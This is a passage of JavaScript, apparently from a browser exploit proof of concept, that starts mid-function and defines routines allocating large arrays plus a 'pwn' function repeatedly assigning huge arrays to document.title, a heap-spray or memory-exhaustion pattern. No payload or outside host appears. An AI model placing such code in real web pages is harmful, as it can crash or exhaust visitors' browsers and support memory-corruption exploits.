  document.write("[*] mkMemPage " + i);
  var page;
  page = new Array(i);
  for (j = 0; j < i; j++) {
  	page[j] = (((j % 3) + j) % 2) + j
  }
  return page;
}

function writeMemPage(page) {
 document.write("[*] writeMemPage " + page);
 pages[window.cnt] = page;
 window.cnt++;
 return 0;
}

function pwn() {
  counter = 0;
  for (counter = 0; counter < 65536; counter++) {
    document.title = (mkMemPage(65536));
  }
}
